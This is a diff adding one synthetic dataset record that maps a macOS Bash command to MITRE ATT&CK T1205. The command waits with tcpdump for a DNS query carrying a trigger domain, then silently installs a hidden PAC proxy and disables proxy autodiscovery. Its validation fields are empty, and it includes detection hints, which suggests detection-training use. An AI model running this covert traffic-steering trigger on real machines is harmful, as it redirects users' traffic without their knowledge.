@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo tcpdump -lnni en0 -A 'udp port 53' | grep -m1 'kn0ck.example.com' && networksetup -setautoproxyurl \"Wi-Fi\" http://127.0.0.1/hidden.pac && networksetup -setproxyautodiscovery \"Wi-Fi\" off",
+  "explanation": "Listens for a DNS query containing a magic domain token and, once seen, switches to a local PAC file for traffic steering. Requires sudo for interface capture. Detection: monitor for unauthorized packet sniffing and anomalous PAC URL changes.",
+  "rationale_steps": [
+    "Capture DNS traffic on en0 and search for the magic string 'kn0ck.example.com'.",
+    "Upon detection, set a specific auto-proxy (PAC) URL and disable WPAD.",
+    "Requires sudo to capture packets from the network interface.",
+    "Detect via EDR for tcpdump usage and configuration monitoring for PAC URL modifications."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-216d7b1a",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
